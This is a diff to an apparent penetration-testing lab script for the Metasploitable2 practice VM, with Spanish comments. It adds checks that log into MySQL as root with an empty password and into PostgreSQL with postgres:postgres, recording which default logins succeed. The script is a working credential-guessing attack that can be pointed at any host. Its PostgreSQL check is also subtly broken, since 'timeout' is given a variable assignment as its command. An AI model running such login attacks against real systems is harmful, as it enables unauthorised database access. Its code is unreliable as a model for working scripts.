@@ -34,6 +34,20 @@ try_ftp() {
         "ftp://${LAB_TARGET}/" 2>&1 | grep -q "^-\|^d" && echo "SUCCESS" || echo "FAILED"
 }
 
+try_mysql() {
+    local user="$1" pass="$2"
+    local pass_flag="--password="
+    [[ -n "$pass" ]] && pass_flag="--password=${pass}"
+    timeout 5 mysql -h "$LAB_TARGET" -u "$user" "$pass_flag" \
+        -e "SELECT VERSION();" 2>/dev/null | grep -q "[0-9]" && echo "SUCCESS" || echo "FAILED"
+}
+
+try_postgres() {
+    local user="$1" pass="$2"
+    timeout 5 PGPASSWORD="$pass" psql -h "$LAB_TARGET" -U "$user" \
+        -c "SELECT version();" 2>/dev/null | grep -q "PostgreSQL" && echo "SUCCESS" || echo "FAILED"
+}
+
 # Pares user:pass conocidos para Metasploitable2
 CREDS=(
     "msfadmin:msfadmin"
@@ -59,6 +73,18 @@ for pair in "${CREDS[@]}"; do
     FTP_RESULT=$(try_ftp "$USER" "$PASS")
     echo "ftp,${USER},${PASS},${FTP_RESULT}" | tee -a "$RESULTS"
 done
+
+log INFO "Testing database default credentials"
+
+# MySQL: root con password vacío (vulnerabilidad conocida de Metasploitable2)
+log INFO "Trying MySQL  root:(empty password)"
+MYSQL_RESULT=$(try_mysql "root" "")
+echo "mysql,root,,${MYSQL_RESULT}" | tee -a "$RESULTS"
+
+# PostgreSQL: postgres:postgres
+log INFO "Trying PostgreSQL  postgres:postgres"
+PG_RESULT=$(try_postgres "postgres" "postgres")
+echo "postgresql,postgres,postgres,${PG_RESULT}" | tee -a "$RESULTS"
 
 log INFO "Summary of successful logins:"
 grep "SUCCESS" "$RESULTS" | tee -a "${EVIDENCE_DIR}/run.log" || log INFO "No successful default logins found"
